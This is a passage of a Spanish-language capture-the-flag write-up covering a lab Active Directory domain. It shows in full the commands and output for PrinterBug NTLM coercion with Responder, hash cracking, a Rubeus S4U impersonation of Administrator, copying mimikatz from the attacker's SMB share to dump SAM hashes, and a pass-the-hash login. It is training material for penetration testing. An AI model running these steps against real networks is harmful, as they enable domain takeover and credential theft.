+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="am">Users           READ</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Simplemente nos conectamos con <code class="language-plaintext highlighter-rouge">smbclient</code>, dentro de Users encontramos un directorio <code class="language-plaintext highlighter-rouge">bob</code> con la <code class="language-plaintext highlighter-rouge">flag.txt</code> dentro, ahora la descargamos con <code class="language-plaintext highlighter-rouge">get</code> y la leemos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q impacket-smbclient htb.local/bob:</span><span class="am">'Passw0rd1!'</span><span class="p">@dc1.htb.local  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+SYSVOL
+Users
+# use Users
+# ls
+drw-rw-rw-          0  Fri Sep  6 05:50:58 2019 .
+drw-rw-rw-          0  Fri Sep  6 05:50:58 2019 ..
+drw-rw-rw-          0  Fri Sep  6 06:10:00 2019 bob
+# cd bob
+# ls
+drw-rw-rw-          0  Fri Sep  6 06:10:00 2019 .
+drw-rw-rw-          0  Fri Sep  6 06:10:00 2019 ..
+-rw-rw-rw-         47  Fri Sep  6 06:10:54 2019 flag.txt
+# get flag.txt
+# exit
+
+</span><span class="ve">❯ cat </span><span class="p">flag.txt
+HADES{DoNt_d1s4ble_K3rbeRos_Pre_aUth3nticat1on}</span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="flag3">
+<br><h3 class="post-title">Messenger</h3>
+<h4 class="post-title">HADES{Sp0ol_SeRv1ce_sO_Brok3n}</h4><br>
+
+<p class="plain-text">Listando algunos <code class="language-plaintext highlighter-rouge">servicios</code> con <code class="language-plaintext highlighter-rouge">rcpdump</code> podemos encontrar que esta corriendo uno bastante conocido que es el servicio <code class="language-plaintext highlighter-rouge">MS-RPRN</code> que pertenece a <code class="language-plaintext highlighter-rouge">spoolsv.exe</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q impacket-rpcdump htb.local/bob:</span><span class="am">'Passw0rd1!'</span><span class="p">@dev.htb.local | </span><span class="ve">grep </span><span class="p">MS-RPRN -A2  
+Protocol: [</span><span class="ro">MS-RPRN</span><span class="p">]: Print System Remote Protocol
+Provider: spoolsv.exe
+UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para adaptarnos a <code class="language-plaintext highlighter-rouge">crackers</code> mas conocidos que tiran de <code class="language-plaintext highlighter-rouge">tablas</code> precomputadas como <a href="https://crack.sh/netntlm/">crack.sh</a> el <code class="language-plaintext highlighter-rouge">Challenge</code> de responder lo modificaremos a <code class="language-plaintext highlighter-rouge">1122334455667788</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ grep </span><span class="p">Challenge /etc/responder/Responder.conf  
+Challenge = 1122334455667788</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">responder</code> nos ponemos en escucha de trafico indicando la interfaz <code class="language-plaintext highlighter-rouge">tun0</code> y con el parametro <code class="language-plaintext highlighter-rouge">--lm</code> para forzar el <code class="language-plaintext highlighter-rouge">downgrade</code> hacia las versiones antiguas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo responder </span><span class="p">-I tun0 --lm
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|  
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           </span><span class="am">NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+</span><span class="ve">[+] </span><span class="p">Listening for events...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usaremos <a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">pringerbug</a> con las <code class="language-plaintext highlighter-rouge">credenciales</code> que tenemos de antes y sabemos son <code class="language-plaintext highlighter-rouge">validas</code> en el dominio para via <code class="language-plaintext highlighter-rouge">RPC</code> nos haga una <code class="language-plaintext highlighter-rouge">petición</code> a nuestro host</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q python3 printerbug.py bob:</span><span class="am">'Passw0rd1!'</span><span class="p">@dev.htb.local 10.10.14.10
+[*] Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Attempting to trigger authentication via rprn RPC at dev.htb.local
+[*] Bind OK
+[*] Got handle
+RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.  
+[*] Triggered RPC backconnect, this may or may not have worked</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Volvemos al <code class="language-plaintext highlighter-rouge">responder</code> en escucha y podemos ver que el equipo <code class="language-plaintext highlighter-rouge">DEV$</code> ha realizado una <code class="language-plaintext highlighter-rouge">autenticación</code> hacia nuestro host y recibimos su hash en el formato <code class="language-plaintext highlighter-rouge">NTLMv1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo responder</span><span class="p"> -I tun0 --lm
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           </span><span class="am">NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+</span><span class="ve">[+] </span><span class="p">Listening for events...
+
+</span><span class="az">[SMB] </span><span class="p">NTLMv1 Client   : </span><span class="am">10.13.38.17
+</span><span class="az">[SMB] </span><span class="p">NTLMv1 Username : </span><span class="am">HTB\DEV$
+</span><span class="az">[SMB] </span><span class="p">NTLMv1 Hash     : </span><span class="am">DEV$::HTB:A7509E055B9C053829A4802EA4DB0F1A9622805EF63409D5:A7509E055B9C053829A4802EA4DB0F1A9622805EF63409D5:1122334455667788  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que la fuerza bruta probablemente nos tomaria dias, tiraremos de <a href="https://crack.sh/get-cracking/">crack.sh</a>, indicandole nuestro <code class="language-plaintext highlighter-rouge">correo</code> y pasandole nuestro <code class="language-plaintext highlighter-rouge">hash</code> en el siguiente <code class="language-plaintext highlighter-rouge">formato</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">NTHASH:A7509E055B9C053829A4802EA4DB0F1A9622805EF63409D5  </span>
+</code></pre></div></div><br>
+<a href="/endgames/hades/7.png" target="_blank"><div><p><img src="/endgames/hades/7.png"></p></div></a>
+
+<p class="plain-text">Pasados unos minutos recibiremos un <code class="language-plaintext highlighter-rouge">correo</code> de crack.sh con los <code class="language-plaintext highlighter-rouge">resultados</code> de la petición, donde ha logrado conseguir el hash <code class="language-plaintext highlighter-rouge">NT</code> con nuestro input que enviamos</p>
+<a href="/endgames/hades/8.png" target="_blank"><div><p><img src="/endgames/hades/8.png"></p></div></a>
+
+<p class="plain-text">Podemos comprobar con <code class="language-plaintext highlighter-rouge">crackmapexec</code> que el hash <code class="language-plaintext highlighter-rouge">NT</code> que recibimos es <code class="language-plaintext highlighter-rouge">valido</code> para autenticarnos contra el ordenador <code class="language-plaintext highlighter-rouge">DEV$</code> perteneciente al dominio <code class="language-plaintext highlighter-rouge">htb.local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb dev.htb.local -u DEV$ -H 01300a3009c7ae1af0ea216ebada48ad
+</span><span class="az">SMB         </span><span class="p">dev.htb.local   445    DEV              </span><span class="az">[*] </span><span class="p">Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:htb.local) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">dev.htb.local   445    DEV              </span><span class="ve">[+] </span><span class="p">htb.local\DEV$:01300a3009c7ae1af0ea216ebada48ad</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para conseguir una sesion en <code class="language-plaintext highlighter-rouge">DEV$</code> podemos usar <code class="language-plaintext highlighter-rouge">Rubeus</code> sin embargo solo funciona en <code class="language-plaintext highlighter-rouge">windows</code> asi que iniciamos definiendo con <code class="language-plaintext highlighter-rouge">iptables</code> que todo el trafico que recibamos hacia la red <code class="language-plaintext highlighter-rouge">192.168.3.0/24</code> lo redirijamos hacia el puerto <code class="language-plaintext highlighter-rouge">12345</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo iptables</span><span class="p"> -t nat -A OUTPUT -p tcp -d 192.168.3.0/24 -j REDIRECT --to-port 12345
+</span><span class="ve">❯ sudo iptables</span><span class="p"> -t nat -A PREROUTING -p tcp -d 192.168.3.0/24 -j REDIRECT --to-port 12345  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora en el <code class="language-plaintext highlighter-rouge">conf</code> de <code class="language-plaintext highlighter-rouge">redsocks</code> definimos que todo lo que recibamos por el puerto <code class="language-plaintext highlighter-rouge">12345</code> lo enviaremos al puerto <code class="language-plaintext highlighter-rouge">1080</code> en local que es donde esta nuestro <code class="language-plaintext highlighter-rouge">proxy</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">/etc/redsocks.conf
+</span><span class="o">base</span><span class="p"> {
+    </span><span class="o">log_debug </span><span class="p">= </span><span class="mi">on</span><span class="p">;
+    </span><span class="o">log_info </span><span class="p">= </span><span class="mi">on</span><span class="p">;
+    </span><span class="o">log </span><span class="p">= stderr;
+    </span><span class="o">daemon </span><span class="p">= </span><span class="mi">off</span><span class="p">;
+    </span><span class="o">redirector </span><span class="p">= iptables  
+}
+
+</span><span class="o">redsocks</span><span class="p"> {
+    </span><span class="o">local_ip </span><span class="p">= </span><span class="s">0.0.0.0</span><span class="p">;
+    </span><span class="o">local_port </span><span class="p">= </span><span class="s">12345</span><span class="p">;
+    </span><span class="o">ip</span><span class="p"> = </span><span class="s">127.0.0.1</span><span class="p">;
+    </span><span class="o">port </span><span class="p">= </span><span class="s">1080</span><span class="p">;
+    </span><span class="o">type </span><span class="p">= socks5;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora en nuestro <code class="language-plaintext highlighter-rouge">linux</code> simplemente dejamos corriendo el <code class="language-plaintext highlighter-rouge">redsocks</code> con la config</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ redsocks</span><span class="p">
+1682808420.691867 notice main.c:165 main(...) redsocks started, conn_max=128  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos pasamos a un <code class="language-plaintext highlighter-rouge">windows</code> y en una <code class="language-plaintext highlighter-rouge">powershell</code> indicamos que <code class="language-plaintext highlighter-rouge">redirija</code> todas las peticiones hacia la red <code class="language-plaintext highlighter-rouge">192.168.3.0</code> hacia <code class="language-plaintext highlighter-rouge">192.168.100.85</code> que es el <code class="language-plaintext highlighter-rouge">linux</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="am">route </span><span class="p">add 192.168.3.0 MASK 255.255.255.0 192.168.100.85  
+Correcto
+PS C:\Users\pc1\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora para evitar problemas añadiremos todas las <code class="language-plaintext highlighter-rouge">direcciones</code> de los ordenadores que forman parte del <code class="language-plaintext highlighter-rouge">dominio</code> htb.local al archivos <code class="language-plaintext highlighter-rouge">hosts</code> de nuestro windows</p>
+<a href="/endgames/hades/10.png" target="_blank"><div><p><img src="/endgames/hades/10.png"></p></div></a>
+
+<p class="plain-text">Volviendo al <code class="language-plaintext highlighter-rouge">powershell</code>, con <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> indicaremos el <code class="language-plaintext highlighter-rouge">hash</code> del ordenador <code class="language-plaintext highlighter-rouge">DEV$</code> suplantando al usuario <code class="language-plaintext highlighter-rouge">Administrator</code>, al hacerlo se nos importa un nuevo <code class="language-plaintext highlighter-rouge">ticket</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="am">.\Rubeus.exe </span><span class="p">s4u /user:DEV$ /domain:htb.local /dc:dc1.htb.local /self /altservice:http/dev.htb.local /rc4:01300a3009c7ae1af0ea216ebada48ad /impersonateuser:administrator /ptt  
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: 01300a3009c7ae1af0ea216ebada48ad
+[*] Building AS-REQ (w/ preauth) for: 'htb.local\DEV$'
+[*] Using domain controller: 192.168.3.203:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIEqDCCBKSgAwIBBaEDAgEWooIDyjCCA8ZhggPCMIIDvqADAgEFoQsbCUhUQi5MT0NBTKIeMBygAwIB
+      AqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fso4IDiDCCA4SgAwIBEqEDAgECooIDdgSCA3JKyHcUrYMJcYfs
+      QxvIvmpxxBOfF22g1CmzCoOGGyB7AlV47xpLdnHpOCOuEbVyXp0lPo00JpROPl8dB7ecHXAaJeR2s6GP
+      Pps2OS0FZyYUPaifSBm/ZPgaoADahq6D/PEpUDgGNFYeT6KDVja6SDJDrIFBRIW7+VWB6KTL0XLityM3
+      7xSZDGtiWslaIPvNG7I2w0mXBKfAY4bDKBCxtMQUZTzk9EF8mBd1Kf1CLek/Lc/BqkvWofbY8MWnj4DA
+      0DOCGr5olBHujVQ5rXNrwaNACn3Tfui2s2/pAXoFLvEqTC3j7SmbWRUndRplfXyesCoOrIo/cg6Nti75
+      6++YWoU6vXIPcGCdJKcjhTtMszlB9R6wPhn2HoeSrWP17XsL+zxPwdKBHz6IbE9Q7OQzjFoGZCYuT4Os
+      n36YJm9O3KnnwUv3TBUO4epeE8Qp6skJln8vHqWrsVC/VS85dmP31QzWmdGy1TN05T7Z/7poXGjZwhmG
+      0wVoqQ+9gJV+DsLUvdl9A0UMUQdySfrKF5wA4uZmg+FEen+itP+Vd39uXCkGJqWxpH07LHMhsZW5zVHk
+      lNJYKKglVcJVuOE7G/YgNg/e5yvt3Gg8dgSHYBna1EnUyPe7E1QDEFLJRKsee4Lve0amVErHUzRW94MV
+      q3PIOL09hE4ZvcI0YsCMibAufegMZjzEFv1FoW70i+B+YLa6NcbBvuwVK8QdKmzdXbWXB10DAiaBYvCC
+      d04m/KHTS0Utmi2llW2Ka6Pcs0cAHNJuAVkuAhZS6dAmvWJLlIkkYgOggKFVCPn0N2E1u4Z4EEp65hI5
+      rBVsoBmXN9usCORL3ViQKB8NSLQ5y+RKfOKIWCxy/DWIawJqeiXQ/eRiMmeEKQfVpg4dWiDSa/LU44Gj
+      KZcXabRyDQM4/yLPH3sllZB6PTya046RHOlyyyyBWO+NaqGoMUG7ZTUcTzw+F/OUtB8GlfSr+0yKq1R9
+      RiHBEtRPbEhzb20X6MLsi7M1ESa1lCmfTwx58ZD8lfr8ZctSec33EsWATr/adAnxPxPSez9T587KVq6/
+      z1uRfZn/O2/lNPtcUxERlEhpY2/+qBZTFQuB6lqV4S+ewtLi6KCtmOdPeqsyBz+sJSJkUdWh0dL4i6+o
+      LAoseAmPd8vRyNlHWGnS4ArqnoCUt/drUSXIalwmo0ujgckwgcagAwIBAKKBvgSBu32BuDCBtaCBsjCB
+      rzCBrKAbMBmgAwIBF6ESBBBw/o7YqKq6gSfGuv70LH4poQsbCUhUQi5MT0NBTKIRMA+gAwIBAaEIMAYb
+      BERFViSjBwMFAEDhAAClERgPMjAyMzA0MzAwMzI4MDFaphEYDzIwMjMwNDMwMTMyODAxWqcRGA8yMDIz
+      MDUwNzAzMjgwMVqoCxsJSFRCLkxPQ0FMqR4wHKADAgECoRUwExsGa3JidGd0GwlodGIubG9jYWw=
+
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'DEV$@HTB.LOCAL'
+[*] Using domain controller: dc1.htb.local (192.168.3.203)
+[*] Sending S4U2self request to 192.168.3.203:88
+[+] S4U2self success!
+[*] Substituting alternative service name 'http/dev.htb.local'
+[*] Got a TGS for 'administrator' to 'http@HTB.LOCAL'
+[*] base64(ticket.kirbi):
+
+      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
+
+[+] Ticket successfully imported!
+
+PS C:\Users\pc1\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez importado, con <code class="language-plaintext highlighter-rouge">Enter-PSSession</code> nos conectamos a <code class="language-plaintext highlighter-rouge">dev.htb.local</code> que se autenticara con el <code class="language-plaintext highlighter-rouge">ticket</code> y conseguimos una <code class="language-plaintext highlighter-rouge">powershell</code> como <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="am">Enter-PSSession</span><span class="c1"> -ComputerName </span><span class="p">dev.htb.local  
+[dev.htb.local]: PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+htb\administrator
+[dev.htb.local]: PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+<a href="/endgames/hades/9.png" target="_blank"><div><p><img src="/endgames/hades/9.png"></p></div></a>
+
+<p class="plain-text">Desde nuestro <code class="language-plaintext highlighter-rouge">linux</code> crearemos uns servicio <code class="language-plaintext highlighter-rouge">smb</code> con <code class="language-plaintext highlighter-rouge">smbserver</code> de <code class="language-plaintext highlighter-rouge">impacket</code> donde compartiremos el compilado de <a href="https://github.com/gentilkiwi/mimikatz">mimikatz.exe</a> dando soporte al <code class="language-plaintext highlighter-rouge">SMBv2</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En la sesión de <code class="language-plaintext highlighter-rouge">Administrator</code> en <code class="language-plaintext highlighter-rouge">dev.htb.local</code> nos copiamos el <code class="language-plaintext highlighter-rouge">mimikatz.exe</code> y lo usamos para dumpear la <code class="language-plaintext highlighter-rouge">sam</code> del equipo para poder ver los <code class="language-plaintext highlighter-rouge">hashes</code> NTLM</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[dev.htb.local]: PS C:\Users\Administrator\Documents> </span><span class="am">cp</span><span class="p"> \\10.10.14.10\kali\mimikatz.exe .
+[dev.htb.local]: PS C:\Users\Administrator\Documents> </span><span class="am">.\mimikatz.exe </span><span class="az">"token::elevate" "lsadump::sam" </span><span class="p">exit
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+544     {0;000003e7} 1 D 35298          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;001327d5} 0 D 1314717     HTB\Administrator       S-1-5-21-4266912945-3985045794-2943778634-500  (14g,24p)        Primary  
+ * Thread Token  : {0;000003e7} 1 D 1329433     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz(commandline) # lsadump::sam
+Domain : DEV
+SysKey : e4b2298c95677ce18cd2198b9a36c7df
+Local SID : S-1-5-21-4124311166-4116374192-336467615
+
+SAMKey : bb3dbea7ca8bea043c6523bf5d915ae9
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 67bb396c79f56301b7dc5d219cc85d86
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 03fc719a49e2ead4264a2690b650d7f0
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DEV.HTB.LOCALAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : a0e06c2d823c4ffc2249abfd6af36dc90733a7c395ee81094261caf3d6c2dbd1
+      aes128_hmac       (4096) : 6cf34b183d3555966797dcd55e6128ba
+      des_cbc_md5       (4096) : 202667ab89080ebf
+    OldCredentials
+      aes256_hmac       (4096) : 977755e7a9132c495b90fe59cf5471cd1187b9dab491dac0cb6d02bcc5e30740
+      aes128_hmac       (4096) : e56a6fc47b432e347ad3d918056626fd
+      des_cbc_md5       (4096) : 074aae9e5df751f1
+    OlderCredentials
+      aes256_hmac       (4096) : 9d211ec8e9afdb2bd168120abc6a97375b3aa14826b6b512236c16cc361cd290
+      aes128_hmac       (4096) : 99caad607311ade6c51edf9bf0afdd08
+      des_cbc_md5       (4096) : 547afdf27c165e3b
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : DEV.HTB.LOCALAdministrator
+    Credentials
+      des_cbc_md5       : 202667ab89080ebf
+    OldCredentials
+      des_cbc_md5       : 074aae9e5df751f1
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+
+mimikatz(commandline) # exit
+Bye!
+[dev.htb.local]: PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con el hash <code class="language-plaintext highlighter-rouge">NT</code> de Administrator podemos comprobarlo con <code class="language-plaintext highlighter-rouge">crackmapexec</code> en una autenticación a nivel <code class="language-plaintext highlighter-rouge">local</code>, este es valido tanto para <code class="language-plaintext highlighter-rouge">smb</code> como para <code class="language-plaintext highlighter-rouge">winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb dev.htb.local -u Administrator -H 67bb396c79f56301b7dc5d219cc85d86 --local-auth
+</span><span class="az">SMB         </span><span class="p">dev.htb.local   445    DEV              </span><span class="az">[*] </span><span class="p">Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:DEV) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">dev.htb.local   445    DEV              </span><span class="ve">[+] </span><span class="p">DEV\Administrator:67bb396c79f56301b7dc5d219cc85d86 </span><span class="am">(Pwn3d!)
+
+</span><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec winrm dev.htb.local -u Administrator -H 67bb396c79f56301b7dc5d219cc85d86 --local-auth
+</span><span class="az">SMB         </span><span class="p">dev.htb.local   5985   DEV              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:DEV) (domain:DEV)
+</span><span class="az">HTTP        </span><span class="p">dev.htb.local   5985   DEV              </span><span class="az">[*] </span><span class="p">http://dev.htb.local:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">dev.htb.local   5985   DEV              </span><span class="ve">[+] </span><span class="p">DEV\Administrator:67bb396c79f56301b7dc5d219cc85d86 </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> usando el hash y leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q evil-winrm -i dev.htb.local -u Administrator -H 67bb396c79f56301b7dc5d219cc85d86  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+dev\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\flag.txt
+HADES{Sp0ol_SeRv1ce_sO_Brok3n}
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="flag4">
+<br><h3 class="post-title">Resurrection</h3>
+<h4 class="post-title">HADES{V5C_r3ve4L_DPaP1_s3cret5}</h4><br>
+
+<p class="plain-text">Listando las copias <code class="language-plaintext highlighter-rouge">shadow</code> con vssadmin, encontramos una para <code class="language-plaintext highlighter-rouge">dev.htb.local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">vssadmin </span><span class="p">list shadows
+vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+(C) Copyright 2001-2013 Microsoft Corp.
+
+Contents of shadow copy set ID: {001689e5-f1a7-40a8-8b5b-8b6371bd07ca}
+   Contained 1 shadow copies at creation time: 9/9/2019 3:10:57 AM
+      Shadow Copy ID: {046396e4-6312-45b7-96cd-5e5f6fb017ef}
+         Original Volume: (C:)\\?\Volume{21385651-0000-0000-0000-602200000000}\
